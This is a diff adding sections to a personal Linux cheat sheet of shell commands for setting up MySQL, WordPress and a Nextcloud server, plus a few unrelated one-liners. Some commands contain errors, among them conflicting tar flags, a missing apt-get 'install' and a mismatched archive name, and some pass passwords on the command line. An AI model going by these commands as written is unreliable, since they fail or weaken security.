+$> mysql -u YOURUSERNAME -p
+$> mysql -u root -p
+## Create a database just for our new WordPress installation.
+$> mysqladmin -u root -p create databasename
+## OR in mysql shell
+$> mysql -u root -p
+## Create a database user just for our new WordPress installation.
+$> mysql> CREATE USER 'your_username_here'@'localhost' IDENTIFIED BY 'newpassword';
+## At the mysql shell, type the following commands. Remember to use your own, valid values for database_name, databaseuser, and also use a strong and secure password as databaseuser_password.
+$> mysql> CREATE DATABASE wp_nameofyoursite;
+$> mysql> GRANT ALL PRIVILEGES ON wp_nameofyoursite.* TO 'your_username_here'@'localhost' IDENTIFIED BY 'your_chosen_password_here';
+$> mysql> FLUSH PRIVILEGES;
+$> mysql> EXIT;
+## OR all together from commandline
+$> mysql -u root -p -e "CREATE USER 'your_username_here'@'localhost' IDENTIFIED BY 'newpassword'; CREATE DATABASE database_name; GRANT ALL PRIVILEGES ON database_name.* TO new_db_user@localhost IDENTIFIED BY 'new_db_user_pass';"
+## Function to setup mysql for wordpress
+## Setup mysql for wordpress. Usage: wordpressmysqlsetup $USER password wp_databasename
+$> function mysqlsetup() { mysql -u root -p -e "CREATE USER '$1'@'localhost' IDENTIFIED BY '$2'; CREATE DATABASE $3; GRANT ALL PRIVILEGES ON $3.* TO $1@localhost IDENTIFIED BY '$2'; SHOW DATABASES;" ; }
+##-----------------------------------------
+## Changing the MySQL root user password
+## In the above command, there is no space between -p and 'OLDPASSWORD'. If you put a space between them, the command will fail.
+$> mysqladmin -u root -p'OLDPASSWORD' password NEWPASSWORD
+## Remove the passwords from .bash_history and .mysql_history.
+## Put space before this command so this command does not show in the hisory and defeat the purpose.
+$>  sed -i 's/Your_Password//g' ~/.bash_history
+$>  sed -i 's/Your_Password//g' ~/.mysql_history
+##=========================================
+## PHP only allows 2MB files upload by default. For uploading bigger files to your server, increase the upload size in php.ini file.
+## search for upload_max_filesize and for post_max_size on the file and change both numbers to whatever you need.
+## See what set to now
+## For php5
+$> cat /etc/php5/apache2/php.ini | grep "upload_max_filesize ="
+$> cat /etc/php5/apache2/php.ini | grep "post_max_size ="
+## For php7.0
+$> cat /etc/php/7.0/apache2/php.ini | grep "upload_max_filesize ="
+$> cat /etc/php/7.0/apache2/php.ini | grep "post_max_size ="
+## Change to what you want
+## For php5 to increase uploads to 20mb
+$> sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 20M/' /etc/php5/apache2/php.ini
+$> sed -i 's/post_max_size = 8M/post_max_size = 80M/' /etc/php5/apache2/php.ini
+## For php7.0 to increase uploads to 20mb
+$> sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 20M/' /etc/php/7.0/apache2/php.ini
+$> sed -i 's/post_max_size = 8M/post_max_size = 80M/' /etc/php/7.0/apache2/php.ini
+## Or use a editor and search for upload_max_filesize and for post_max_size on the file and change both numbers to whatever you need.
+## For php5
+$> sudo nano /etc/php5/apache2/php.ini
+## For php7.0
+$> sudo nano /etc/php/7.0/apache2/php.ini
+##==========================================
+##============================================
+## ######################################
+## ##    END LAMP apache mysql php
+## ######################################
+##==========================================
+##==========================================
+## ######################
+## ##    Wordpress
+## ######################
+##==========================================
+### Wordpress
+## Function install WordPress into current folder
+@> function installwordpress() {
+@>     gpasswd -a $USER www-data
+@>     wget http://wordpress.org/latest.tar.gz
+@>     tar xzvf latest.tar.gz
+@>     cp -rf wordpress/** ./
+@>     rm -R wordpress
+@>     cp wp-config-sample.php wp-config.php
+@>     wget -O wp.keys https://api.wordpress.org/secret-key/1.1/salt/
+@>     sed -i '/#@-/r wp.keys' wp-config.php
+@>     sed -i "/#@+/,/#@-/d" wp-config.php
+@>     mkdir wp-content/uploads
+@>     find . -type d -exec chmod 755 {} \;
+@>     find . -type f -exec chmod 644 {} \;
+@>     chown -R :www-data *
+@>     chmod 640 wp-config.php
+@>     rm -f latest.tar.gz
+@>     rm -f wp.keys
+@> }
+##------------------------------------------
+## Function install WordPress into current folder oneliner
+$> function installwordpress() { gpasswd -a $USER www-data; wget http://wordpress.org/latest.tar.gz; tar xzvf latest.tar.gz; cp -rf wordpress/** ./; rm -R wordpress; cp wp-config-sample.php wp-config.php; wget -O wp.keys https://api.wordpress.org/secret-key/1.1/salt/; sed -i '/#@-/r wp.keys' wp-config.php; sed -i "/#@+/,/#@-/d" wp-config.php; mkdir wp-content/uploads; find . -type d -exec chmod 755 {} \;; find . -type f -exec chmod 644 {} \;; chown -R :www-data *; chmod 640 wp-config.php; rm -f latest.tar.gz; rm -f wp.keys; }
+##------------------------------------------
+## Install WordPress
+$> cd /var/www/
+$> chown -R :www-data html
+## Add your user to group for access
+$> sudo gpasswd -a $USER www-data
+$> cd /var/www/html
+$> wget http://wordpress.org/latest.tar.gz
+## Download WordPress, modify wp-config.php, set permissions, some steps require sudo
+## Get wordpress
+$> wget http://wordpress.org/latest.tar.gz
+$> tar -xzvf latest.tar.gz
+$> cp -rf wordpress/** ./
+$> rm -R wordpress
+$> cp wp-config-sample.php wp-config.php
+## Change permissions
+$> find . -type d -exec chmod 755 {} \;
+$> find . -type f -exec chmod 644 {} \;
+$> mkdir wp-content/uploads
+$> chown -R :www-data wp-content/uploads
+$> chown -R $USER:www-data *
+$> chmod 640 wp-config.php
+## Specify database user and password.
+$> sed -i "s/database_name_here/$dbname/g" wp-config.php
+$> sed -i "s/username_here/$dbuser/g" wp-config.php
+$> sed -i "s/password_here/$dbpass/g" wp-config.php
+## Change the table prefix to something unique
+$> sed -i "s/table_prefix  = 'wp_'/table_prefix  = 'wp_uniquename_'/"  wp-config.php
+## GID is the numerical primary group ID for the user. Numeric values for GIDs are listed in /etc/group.
+$> cat /etc/group
+## Go to wordpress configuration page
+$> firefox http://ip_address/wp-admin/install.php
+## !!!!Better to use http://ip_address/wp-admin/install.php, as above, especially if in subdirectory.
+## Get salt from website and install to wp-config.php with sed. Can redo this part if you think site has been compromised. This will force everyone to re-login.
+## Setup wordpress without browser.
+$> wget -O wp.keys https://api.wordpress.org/secret-key/1.1/salt/
+$> sed -i '/#@-/r wp.keys' wp-config.php
+$> sed -i "/#@+/,/#@-/d" wp-config.php
+## Cleanup
+$> rm -f latest.tar.gz
+$> rm -f wp-install.sh
+$> rm -f wp.keys
+##==========================================
+### Export and import wordpress sites
+## Two ways to get wordpress site
+## Copy and compress total site
+$> cd /var/www
+$> tar -cvzf html_sitename_20190124.tar.gz html
+## Copy tar.gz to new server with scp or just copy by making it availables and wget from remote server
+$> scp html_sitename_20190124.tar.gz UserName@192.168.1.8:/var/www
+## On new server
+$> ssh yourname@192.168.1.8
+## If you need a .pem use -i
+$> ssh -i ./commandlinefun.pem yourname@192.168.1.8
+## Decompress total site
+$> cd /var/www
+$> tar -xvzf html_sitename_20190124.tar.gz
+$> cd /var/www/html
+## Change any references in wp-config.php to new site
+$> sed -i 's/oldaddress/newaddress/g' wp-config.php
+## OR
+## Export Wordpress xml in wordpress
+## Import Wordpress xml into wordpress on new server
+## Settings>
+##-----------------------------------------
+## Export mysql database
+## No space between -p and password
+$> mysqldump -u [uname] -p[pass] db_name > db_backup.sql
+## Example
+$> mysqldump -u Your_Username -pYour_Password wp_wordpress_database_name > wp_wordpress_database_name_backup_20190118.sql
+##-----------------------------------------
+## Create database to import into
+$> mysql -u $USER -p
+$@ mysql> SHOW DATABASES;
+$@ mysql> CREATE DATABASE wp_wordpress_database_name;
+$@ mysql> SHOW DATABASES;
+## Create a wordpress database user and grant privileges on that database
+$@ mysql> CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'newuserspassword';
+$@ mysql> GRANT ALL PRIVILEGES ON  wp_wordpress_database_name* TO 'newuser'@'localhost';
+$@ mysql> EXIT;
+## Import database into mysql
+$> mysql -u Your_Username -p -h localhost wp_wordpress_database_name < /path/to/db_backup.sql
+## Or if sudo mysql works like on AWS
+$> sudo mysql -h localhost wp_wordpress_database_name < /path/to/wp_wordpress_database_name_backup_20190118.sql
+##-----------------------------------------
+## Stop white screen of death due to redirect or change to new URL
+## Rewrite url in wordpress database
+$> mysql -u YOURUSERNAME -p
+## In mysql command  where '192.168.1.3' is old server address, and 'mynewurl.com' is new server URL. Can use an address instead.
+$@ mysql> SHOW DATABASES;
+$@ mysql> USE wp_YourWordpressDatabase;
+## Check where site is directed rename to match your system
+$@ mysql> SELECT option_value FROM wp_uniquename_options WHERE option_name = 'home' OR option_name = 'siteurl';
+## Replace with new site
+$@ mysql> UPDATE wp_uniquename_posts SET guid = replace(guid, '192.168.1.3','mynewurl.com');
+$@ mysql> UPDATE wp_uniquename_posts SET post_content = replace(post_content, '192.168.1.3', 'mynewurl.com');
+$@ mysql> UPDATE wp_uniquename_links SET link_url = replace(link_url, '192.168.1.3', 'mynewurl.com');
+$@ mysql> UPDATE wp_uniquename_links SET link_image = replace(link_image, '192.168.1.3', 'mynewurl.com');
+$@ mysql> UPDATE wp_uniquename_postmeta SET meta_value = replace(meta_value, '192.168.1.3', 'mynewurl.com');
+$@ mysql> UPDATE wp_uniquename_usermeta SET meta_value = replace(meta_value, '192.168.1.3', 'mynewurl.com');
+$@ mysql> UPDATE wp_uniquename_options SET option_value = replace(option_value, '192.168.1.3', 'mynewurl.com') WHERE option_name = 'home' OR option_name = 'siteurl';
+## Check where site is directed now
+$@ mysql> SELECT option_value FROM wp_uniquename_options WHERE option_name = 'home' OR option_name = 'siteurl';
+##------------------------------------------
+## Go to webite to check if it worked. Sometimes the site is cached and will try to go to old cache, restart browser or delete old history.
+$> firefox http://yoursite
+## Go to admin section to check if that worked
+$> firefox http://yoursite/wp-admin
+##------------------------------------------
+## OR functions to do same
+### Wordpress mysql functions, may not work on remote ssh session
+## Show local mysql databases
+$> function mysqldatabases() { mysql -u root -p -e "SHOW DATABASES;" ; }
+##------------------------------------------
+## Show where wordpress redirects. Usage; wordpressmysqlcheck wp_database wp_uniquetableprefix_
+$> function wordpressmysqlcheck() { mysql -u root -p -e "USE $1; SELECT option_value FROM $2options WHERE option_name = 'home' OR option_name = 'siteurl';" ; }
+##------------------------------------------
+## Change where wordpress redirects. Usage; wordpressmysqlredirect wp_database wp_uniquetableprefix_ 192.168.1.10 mynewurl.com
+$> function wordpressmysqlredirect() { mysql -u root -p -e "USE $1; UPDATE $2posts SET guid = replace(guid, '$3','$4'); UPDATE $2posts SET post_content = replace(post_content, '$3', '$4'); UPDATE $2links SET link_url = replace(link_url, '$3', '$4'); UPDATE $2links SET link_image = replace(link_image, '$3', '$4'); UPDATE $2postmeta SET meta_value = replace(meta_value, '$3', '$4'); UPDATE $2usermeta SET meta_value = replace(meta_value, '$3', '$4'); UPDATE $2options SET option_value = replace(option_value, '$3', '$4') WHERE option_name = 'home' OR option_name = 'siteurl';" ; }
+##==========================================
+### To recover a mysql database without an export .sql
+## First make a new installation of mysql you can use to recover old one.
+## Need both ibdata1 and database folder containing .frm files
+## on old sever not working or a hard drive with database go to /var/lib/mysql find database and copy it
+$> cd /path/var/lib/
+## If local
+$> cp mysql /path/for/copy
+## Remote
+## Compress the needed database mysql folder
+$> tar -cxzf yourdatabasename_20190208.tar.gz mysql
+## Copy database to new server
+$> scp yourdatabasename_20190208.tar.gz $USER@192.168.1.3:/path/to/remote
+## On new server set up LAMP, see above
+## Unpack database folder with .frm files and ibdata1 file.
+$> tar -xvzf yourdatabasename_20190208.tar.gz
+## change directory into copy of old mysql folder
+$> cd mysql
+## Move newly created database ibdata1 file to replace with old one you are trying to recover
+$> mv /var/lib/mysql/ibdata1 /var/lib/mysql/ibdata1.default
+## Copy old ibdata1 to new database folder
+$> cp ibdata1 /var/lib/mysql
+## Copy the folder of the database you want to recover that holds the .frm files
+$> cp wp_databasename /var/lib/mysql
+$> cd /var/lib/mysql
+## Change permissions so mysql can use new database
+$> chown -R mysql:mysql wp_databasename
+$> chmod -R 750 wp_databasename
+## Sign into mysql and see if you can access database
+$> mysql -u root -p
+$@ mysql> SHOW DATABASES;
+$@ mysql> USE wp_database;
+$@ mysql> SHOW TABLES;
+$@ mysql> CHECK TABLE wp_commentsmeta;
+## IF ok then export the .sql
+$> mysqldump -u Your_Username -p wp_databasename > wp_database_backup_20190118.sql
+$> mysqldump -u Your_Username -p -h '192.168.1.3' wp_databasename > wp_database_backup_20190118.sql
+## Now you can import the sql into any other server.
+##==========================================
+### Change Table Prefix from default in working Wordpress site
+## 1. Take mysql database backup as a precaution. If a mistake is made, can re-import and try again.
+$> mysqldump -u [uname] -p -h 'localhost' databasename > databasename_backup_20190219.sql
+## 2. Change $table_prefix = ‘wp_’; in /var/www/html/wp-config.php
+$> sed -i "s/table_prefix  = 'wp_'/table_prefix  = 'wp_uniquename_'/"  /var/www/html/wp-config.php
+## 3. Change table names in mysql
+$> mysql -u root -p
+$@ mysql> USE databasename;
+## Format: RENAME TABLE `oldtablename` TO `newtablename`;
+## rename all the tables add any additional tables from plugins. Plugins may mess this up of course. Best practice is to remove and do procedure then reinstall reconfigure plugins.
+$@ mysql> RENAME TABLE wp_comments                  TO   wp_uniquename_comments                   ;
+$@ mysql> RENAME TABLE wp_links                     TO   wp_uniquename_links                      ;
+$@ mysql> RENAME TABLE wp_options                   TO   wp_uniquename_options                    ;
+$@ mysql> RENAME TABLE wp_postmeta                  TO   wp_uniquename_postmeta                   ;
+$@ mysql> RENAME TABLE wp_posts                     TO   wp_uniquename_posts                      ;
+$@ mysql> RENAME TABLE wp_term_relationships        TO   wp_uniquename_term_relationships         ;
+$@ mysql> RENAME TABLE wp_term_taxonomy             TO   wp_uniquename_term_taxonomy              ;
+$@ mysql> RENAME TABLE wp_termmeta                  TO   wp_uniquename_termmeta                   ;
+$@ mysql> RENAME TABLE wp_terms                     TO   wp_uniquename_terms                      ;
+$@ mysql> RENAME TABLE wp_usermeta                  TO   wp_uniquename_usermeta                   ;
+$@ mysql> RENAME TABLE wp_users                     TO   wp_uniquename_users                      ;
+$@ mysql> RENAME TABLE wp_commentmeta               TO   wp_uniquename_commentmeta                ;
+## 4. Rename in wp_options
+## in table wp_uniquename_options
+## Look under the option_name column header and change wp_user_roles to wp_uniquename_user_roles.
+## In this case
+$> mysql> UPDATE `wp_uniquename_options` SET `option_name` = 'wp_uniquename_user_roles' WHERE `option_name` = 'wp_user_roles';
+## 5. Rename in wp_usermeta
+## in table wp_uniquename_usermeta
+## Change all meta_key entries to new prefix
+$> mysql> UPDATE `wp_uniquename_usermeta` SET `meta_key` = REPLACE( `meta_key`, 'wp_', 'wp_uniquename_' );
+##------------------------------------------
+## Function to rename the table_prefix to a unique name /var/www/html/wp-config.php
+## Usage: wordpressmysqltableprefix wordpress_databasename tableprefix_ newtableprefix_
+## Example: wordpressmysqltableprefix wordpress wp_ wp_uniquename_
+$> function wordpressmysqltableprefix() { mysql -u root -p -e "USE $1; RENAME TABLE $2comments TO $3comments; RENAME TABLE $2links TO $3links; RENAME TABLE $2options TO $3options; RENAME TABLE $2postmeta TO $3postmeta; RENAME TABLE $2posts TO $3posts; RENAME TABLE $2term_relationships TO $3term_relationships; RENAME TABLE $2term_taxonomy TO $3term_taxonomy; RENAME TABLE $2termmeta TO $3termmeta; RENAME TABLE $2terms TO $3terms; RENAME TABLE $2usermeta TO $3usermeta; RENAME TABLE $2users TO $3users; RENAME TABLE $2commentmeta TO $3commentmeta; UPDATE `$3options` SET `option_name` = '$3user_roles' WHERE `option_name` = '$2user_roles'; UPDATE `$3usermeta` SET `meta_key` = REPLACE( `meta_key`, '$2', '$3' ); SHOW TABLES;" ; }"
+##==========================================
+## ########################
+## ##    END Wordpress
+## ########################
+##==========================================
+## ################################################
+## ##    Nextcloud Cloud Server Install
+## ################################################
+##==========================================
+## https://nextcloud.com/
+$> wget https://download.nextcloud.com/server/releases/nextcloud-15.0.5.zip
+##==========================================
+### Nextcloud server setup
+## https://help.nextcloud.com/
+## https://civihosting.com/blog/how-to-install-nextcloud-server/
+##--------------------------------------------
+## LAMP install
+## Install newer LAMP Web Server implementation with php7.0
+$> sudo apt-get install apache2 mysql-server mysql-client php7.0 libapache2-mod-php7.0 php7.0-cli php7.0-gd libapache2-mod-php7.0 php7.0-mysql
+## php packages fileinfo. some duplicated from above
+$> sudo apt-get install php7.0-intl php-imagick php7.0-xml php7.0-zip php7.0-bz2 php7.0-opcache php7.0-gd php7.0-json php7.0-mysql php7.0-curl php7.0-mbstring php7.0-imap php7.0-gmp
+##--------------------------------------------
+## Install apache modules
+## There are some recommended Apache modules to be enabled for Nextcloud.
+$> sudo a2enmod rewrite mime dir env headers rewrite
+## Enable SSL
+$> sudo a2enmod ssl
+$> sudo a2ensite default-ssl
+## configuration file for Nextcloud in /etc/apache2/sites-available. Create a new file in that folder called nextcloud.conf
+$> sudo touch /etc/apache2/sites-available/nextcloud.conf
+$> sudo su
+## Setup Nextcloud in folder /var/www/nextcloud
+$> printf '## Setup apache2 for Nextcloud\nAlias /nextcloud "/var/www/nextcloud/"\n\n<Directory /var/www/nextcloud/>\n Options +FollowSymlinks\n AllowOverride All\n\n<IfModule mod_dav.c>\n Dav off\n</IfModule>\n\nSetEnv HOME /var/www/nextcloud\nSetEnv HTTP_HOME /var/www/nextcloud\n\n</Directory>\n' > /etc/apache2/sites-available/nextcloud.conf;
+## Check the file
+$> cat /etc/apache2/sites-available/nextcloud.conf
+## Or use an editor to add setting to apache2 available sites
+$> sudo mcedit /etc/apache2/sites-available/nextcloud.conf
+## Add the folowing without the $@
+$@ ## Setup apache for Nextcloud
+$@ Alias /nextcloud "/var/www/nextcloud/"
+$@
+$@ <Directory /var/www/nextcloud/>
+$@  Options +FollowSymlinks
+$@  AllowOverride All
+$@
+$@ <IfModule mod_dav.c>
+$@  Dav off
+$@ </IfModule>
+$@
+$@ SetEnv HOME /var/www/nextcloud
+$@ SetEnv HTTP_HOME /var/www/nextcloud
+$@
+$@ </Directory>
+## Save that file in /etc/apache2/sites-available and then create a symlink to /etc/apache2/sites-enabled with the command:
+$> ln -s /etc/apache2/sites-available/nextcloud.conf /etc/apache2/sites-enabled/nextcloud.conf
+$> exit
+## Finally, restart Apache with the command:
+$> sudo service apache2 restart
+##-----------------------------------------
+## Create a mysql database and user with password for nextcloud
+## Function to setup mysql for nextcloud
+## Setup mysql for wordpress. Usage: mysqlsetup $USER password databasename
+$> function mysqlsetup() { mysql -u root -p -e "CREATE USER '$1'@'localhost' IDENTIFIED BY '$2'; CREATE DATABASE $3; GRANT ALL PRIVILEGES ON $3.* TO $1@localhost IDENTIFIED BY '$2'; SHOW DATABASES;" ; }
+## Put in root mysql password press enter
+## Procede execution with a space so it does not go in .bash_history and expose the password, Example:
+$>  mysqlsetup $USER nextcloudpassword nextcloud
+##--------------------------------------------
+## PHP only allows 2MB files upload by default. For uploading bigger files to your server, increase the upload size in php.ini file.
+## search for upload_max_filesize and for post_max_size on the file and change both numbers to whatever you need.
+## See what set to now. For php7.0
+$> cat /etc/php/7.0/apache2/php.ini | grep "upload_max_filesize ="
+$> cat /etc/php/7.0/apache2/php.ini | grep "post_max_size ="
+## Change to what you want. For php7.0 to increase uploads to 2000mb
+$> sudo sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 2000M/' /etc/php/7.0/apache2/php.ini
+$> sudo sed -i 's/post_max_size = 8M/post_max_size = 2000M/' /etc/php/7.0/apache2/php.ini
+## Or use a editor and search for upload_max_filesize and for post_max_size on the file and change both numbers to whatever you need.
+## For php7.0
+$> sudo nano /etc/php/7.0/apache2/php.ini
+##---------------------------------------------
+## Nextcloud Install, manual best way. snap is very invasive, do not use.
+$> sudo apt-get install snapd
+$> sudo snap install nextcloud
+## OR
+## Setup using setup-nextcloud.php, manual best way
+$> wget https://download.nextcloud.com/server/installer/setup-nextcloud.php
+$> mkdir /var/www/nextcloud
+$> cp setup-nextcloud.php /var/www/nextcloud
+$> sudo chown -R root:www-data /var/www/nextcloud/
+$> sudo chmod -R 770 /var/www/nextcloud/
+## Use install wizard
+$> firefox http://IP_OF_SERVER/nextcloud/setup-nextcloud.php
+## Then Nextcloud first use setup wizard
+$> firefox http://IP_OF_SERVER/nextcloud
+## “Storage & database” and then click on “MySQL", enter the Database user, password and name
+## OR
+## Manual setup, manual best way
+## server packages
+$> wget https://download.nextcloud.com/server/releases/nextcloud-15.0.5.tar.bz2
+$> tar -vxjf nextcloud-9.0.50.tar.bz2
+## or
+$> wget https://download.nextcloud.com/server/releases/nextcloud-15.0.5.zip
+$> unzip nextcloud-15.0.5.zip
+## You should now see the folder nextcloud in the current working directory.
+## Apache HTTP server you may safely install Nextcloud in your Apache document root:
+$> cp -r nextcloud /path/to/webserver/document-root
+$> cp -r nextcloud /var/www
+## or
+$> sudo mv nextcloud /var/www
+## Set permissions
+$> chown -R root:www-data /var/www/nextcloud/
+$> sudo mkdir -p /var/www/nextcloud/data
+$> sudo mkdir -p /var/www/nextcloud/assets
+$> sudo mkdir -p /var/www/nextcloud/updater
+$> sudo find /var/www/nextcloud/ -type f -print0 | xargs -0 chmod 0640
+$> sudo find /var/www/nextcloud/ -type d -print0 | xargs -0 chmod 0750
+$> sudo chown -R root:www-data /var/www/nextcloud/
+$> sudo chown -R www-data:www-data /var/www/nextcloud/apps/
+$> sudo chown -R www-data:www-data /var/www/nextcloud/assets/
+$> sudo chown -R www-data:www-data /var/www/nextcloud/config/
+$> sudo chown -R www-data:www-data /var/www/nextcloud/data/
+$> sudo chown -R www-data:www-data /var/www/nextcloud/themes/
+$> sudo chown -R www-data:www-data /var/www/nextcloud/updater/
+## sudo chown -R www-data:www-data /var/www/nextcloud/{apps,assets,config,data,themes,updater}
+$> sudo chmod +x /var/www/nextcloud/occ
+## Make .htaccess then do
+$> chmod 0644 /var/www/nextcloud/.htaccess
+$> chown root:www-data /var/www/nextcloud/.htaccess
+$> chmod 0644 /var/www/nextcloud/data/.htaccess
+$> chown root:www-data /var/www/nextcloud/data/.htaccess
+##--------------------------------------------
+## Log in to Nextcloud
+## You’re finally ready to log in to your Nextcloud server. Point a browser to https://IP_OF_SERVER/nextcloud (where IP_OF_SERVER is the actual IP address of the server hosting Nextcloud).
+## Nextcloud setup wizard
+$> firefox http://IP_OF_SERVER/nextcloud
+## “Storage & database” and then click on “MySQL", enter the Database user, password and name
+##--------------------------------------------
+## The Nextcloud desktop client
+$> sudo apt-get nextcloud-client
+## This repository contains the stable releases of the client. Desktop client PPA compiled for Ubuntu.
+## You can update your system with unsupported packages from this untrusted PPA by adding ppa:nextcloud-devs/client to your system's Software Sources. (Read about installing)
+$> sudo add-apt-repository ppa:nextcloud-devs/client
+$> sudo apt-get update
+$> sudo apt-get nextcloud-client
+##--------------------------------------------
+##==========================================
+## #####################################################
+## ##    END  Nextcloud Cloud Server Install
+## #####################################################
 
 
+## ##########################################################
+## ##    END Packages
+## ##########################################################
+## ##########################################################
+## ##########################################################
 ##==========================================
 
 
@@ -11025,6 +11038,18 @@ $> kubectl run nginx-check --image-pull-policy=Never --image=hello-world2:latest
 ## ########################################
 ## ##    Unsorted
 ## ########################################
+##==========================================
+## List all accessed configuration files while executing a program in linux terminal (improved version)
+## Last listed files presumably have higher precedency then files listed first, i.e. configuration files in the personal .config directory will be listed last and their config parameters will be more authoritative then default config parameters defined in /etc directory which are usually listed above them. If you replace ".conf" with ".ini" in the command, initial files will be listed instead of config files. If you do not like to list multiple access to the same config file, pipe to "uniq" or "uniq -c" to prefix lines by the number of occurrences Show Sample Output
+$> strace 2>&1 <any_executable> |egrep -o "\".*\.conf\""
+##==========================================
+## Convert an image sequence into a video
+$> ffmpeg -framerate 30 -pattern_type glob -i '*.jpg' -c:v libx264 -pix_fmt yuv420p out.mp4
+##==========================================
+## Print nic name of current connection
+$> nmcli -g name,type connection show --active|awk -F: '/ethernet|wireless/ { print $1 }'
+## Print interface that is up and running
+$> ip addr | awk '/state UP/ {print $2}' | sed 's/.$//'
 ##==========================================
 ## Make sure your user owns the directories you're mounting:
 $> chown -R $(id -un):$(id -gn) /path/to/your/data
@@ -12960,25 +12985,137 @@ $> chmod +x ipu6ep_fw.bin
 
 
 ##==========================================
+## fuzzy finder - search history with fzf
+$> apt install fzf,
+$> dpkg -L fzf | grep -e key-bindings | grep bash,
+$> source [.../key-bindings.bash] ==  . [.../key-bindings.bash],
+$> [ctrl-r] / ^r - history search -- ^t -- file ((term-) arg) search
 
 
+##==========================================
+
+
+##==========================================
+
+
+##==========================================
+
+
+##==========================================
+
+
+##==========================================
+## ###################################################
+## ##    Key words. Use to search dockument
+## ###################################################
+##    Information
+##    info
+##    hardware
+##        cpu
+##        gpu
+##        ram
+##    OS
+##        cloud-init.
+##        dd
+##        iso
+##        packagemanager
+##            apt
+##            dpkg
+##
+##    power.
+##        shutdown
+##        start
+##        battery
+##            save power
+##    shell
+##    backup
+##    logs
+##    automation
+##    Keyboard
+##    Setup
+##        install.  apps
+##        repositories
+##        ssh LAMP apache mysql php Wordpress
+##        Nextcloud
+##    Networking
+##        nmap
+##
+##    Use
+##        filesystem
+##            permissions
+##        Sound
+##        Video
+##        Print
+##    Framebuffer
+##    DANGER
+##    Python Stuff
+##    Extra Characters
+##    GUI Control
+##    Unsorted
+##    vim
+##    shell
+##        parameters
+##        permissions
+##        Pipes
+##        More functions
+##        scriping
+##        multiplex
+##            screen
+##            tmux
+##            term39
+##    bashrc
+##        Settings
+##        Prompt
+##        History
+##        System
+##        Functions
+##        Aliases
+##            GUI
+##            Search
+##            Media Encode
+##            Image
+##            Encryption
+##            Command Parameters
+##    tmux
+##    git
+##    install software
+##    text
+##    sql query
+##    docker
+##    cloud
+##    ssh
+##        keys
+##        jump
+##        tunnel
+##        mount
+##    networking
+##    system
+##    multimedia
+##    video
+##    web
+##        view
+##        host
+##    files
+##        redirect
+##        pipe
+##    GUI gui mouse.
+##    cool pipes
+##    Framebuffer
+##    android
+##        abd
+##        chromecast
+##    sync
+##
+##    bluetooth
+##    wifi
+##    web
+##    html
+##        HTML
+##        CSS Cheatsheets
+##    json
+##    python
 ##==========================================
 ## Remove the $> to activate the commands
 $> sed -i 's/^$> //g ' -e 's/^@> //g' cli.sh
-
-##==========================================
-
-
-##==========================================
-
-
-##==========================================
-
-
-##==========================================
-
-
-##==========================================
-
 
 ##==========================================
